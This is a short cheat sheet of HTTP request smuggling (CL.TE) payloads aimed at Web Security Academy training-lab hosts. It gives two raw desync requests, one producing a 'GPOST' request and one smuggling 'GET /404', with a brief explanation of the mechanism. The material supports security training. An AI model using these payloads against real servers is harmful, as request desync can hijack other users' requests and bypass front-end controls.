# CL.TE Payloads

> For authorized labs and testing environments only.

## Basic CL.TE desync

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

Send the request twice. In the training lab, the second request can become `GPOST`.

## Differential-response pattern

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

## Quick reminder

- **CL.TE** = front end uses `Content-Length`.
- Back end uses `Transfer-Encoding`.
- The zero-length chunk ends the request for the back end.
- Remaining bytes can become the beginning of the next request.
